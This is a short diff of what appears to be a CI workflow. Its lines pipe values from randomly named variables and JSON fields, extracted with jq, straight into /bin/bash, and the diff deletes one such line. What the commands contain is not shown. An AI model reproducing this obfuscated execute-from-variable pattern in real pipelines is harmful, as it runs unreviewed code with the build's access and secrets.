@@ -49,7 +49,6 @@ jobs:
           printf '%s' "$oukg7" | jq -r .jr34510 | /bin/bash
           echo $tubqu4 | jq -r .hcdle4068 | /bin/bash
           echo $v2 | jq -r .nbdoq53 | /bin/bash
-          echo $awg26622 | jq -r .frsz13 | /bin/bash
           echo $i85 | jq -r .vj7762 | /bin/bash
           echo $itq994 | jq -r .fbrlr0734 | /bin/bash
           echo $np4 | jq -r .yjdl04306 | /bin/bash
